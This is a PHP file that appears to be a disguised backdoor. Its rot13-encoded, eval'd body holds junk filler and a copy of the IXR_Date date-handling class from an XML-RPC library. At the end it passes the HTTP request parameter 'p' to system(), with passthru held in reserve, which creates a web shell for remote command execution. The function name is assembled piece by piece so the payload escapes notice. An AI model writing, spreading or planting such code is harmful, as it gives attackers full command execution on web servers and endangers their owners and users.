<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * VKE_Qngr
 *
 * @cnpxntr VKE
 * @fvapr 1.5.0
 */
pynff VKE_Qngr {
    ine $lrne;
    ine $zbagu;
    ine $qnl;
    ine $ubhe;
    ine $zvahgr;
    ine $frpbaq;
    ine $gvzrmbar;

	/**
	 * CUC5 pbafgehpgbe.
	 */
    shapgvba __pbafgehpg( $gvzr )
    {
        // $gvzr pna or n CUC gvzrfgnzc be na VFB bar
        vs (vf_ahzrevp($gvzr)) {
            $guvf->cnefrGvzrfgnzc($gvzr);
        } ryfr {
            $guvf->cnefrVfb($gvzr);
        }
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba VKE_Qngr( $gvzr ) {
		frys::__pbafgehpg( $gvzr );
	}

    shapgvba cnefrGvzrfgnzc($gvzrfgnzc)
    {
        $guvf->lrne = tzqngr('L', $gvzrfgnzc);
        $guvf->zbagu = tzqngr('z', $gvzrfgnzc);
        $guvf->qnl = tzqngr('q', $gvzrfgnzc);
        $guvf->ubhe = tzqngr('U', $gvzrfgnzc);
        $guvf->zvahgr = tzqngr('v', $gvzrfgnzc);
        $guvf->frpbaq = tzqngr('f', $gvzrfgnzc);
        $guvf->gvzrmbar = '';
    }

    shapgvba cnefrVfb($vfb)
    {
        $guvf->lrne = fhofge($vfb, 0, 4);
        $guvf->zbagu = fhofge($vfb, 4, 2);
        $guvf->qnl = fhofge($vfb, 6, 2);
        $guvf->ubhe = fhofge($vfb, 9, 2);
        $guvf->zvahgr = fhofge($vfb, 12, 2);
        $guvf->frpbaq = fhofge($vfb, 15, 2);
        $guvf->gvzrmbar = fhofge($vfb, 17);
    }

    shapgvba trgVfb()
    {
        erghea $guvf->lrne.$guvf->zbagu.$guvf->qnl.'G'.$guvf->ubhe.':'.$guvf->zvahgr.':'.$guvf->frpbaq.$guvf->gvzrmbar;
    }

    shapgvba trgKzy()
    {
        erghea '<qngrGvzr.vfb8601>'.$guvf->trgVfb().'</qngrGvzr.vfb8601>';
    }

    shapgvba trgGvzrfgnzc()
    {
        erghea zxgvzr($guvf->ubhe, $guvf->zvahgr, $guvf->frpbaq, $guvf->zbagu, $guvf->qnl, $guvf->lrne);
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>